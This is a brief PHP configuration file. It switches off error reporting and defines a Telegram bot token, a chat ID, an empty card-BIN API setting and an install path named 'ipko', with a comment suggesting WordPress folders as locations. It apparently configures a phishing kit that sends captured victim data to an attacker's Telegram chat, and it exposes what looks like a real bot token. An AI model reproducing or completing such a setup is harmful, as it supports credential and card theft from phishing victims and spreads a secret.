<?php
error_reporting(0);

define("MAIN_PATH", 'ipko'); // ex : wp-admin/home/wp-content
define("TOKEN", '8225030392:AAE1j7QJN9r1lKr5iEUY4GmaceIw7yxVc9M');
define("CHATID", '6497767856');
define("ApiBin", '');

?>